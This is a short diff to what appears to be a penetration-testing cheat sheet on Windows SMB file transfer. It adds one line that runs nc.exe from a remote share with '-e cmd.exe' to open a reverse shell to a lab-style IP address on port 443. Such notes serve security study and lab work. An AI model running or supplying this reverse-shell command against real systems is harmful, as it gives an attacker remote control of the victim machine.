@@ -33,7 +33,11 @@ del test.txt
 
 # Remove SMB share
 net use /d \\10.13.14.10\share
+
+# Older Windows (e.g., xp), use directly
+\\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 443
 ```
+
 
 <br>
 
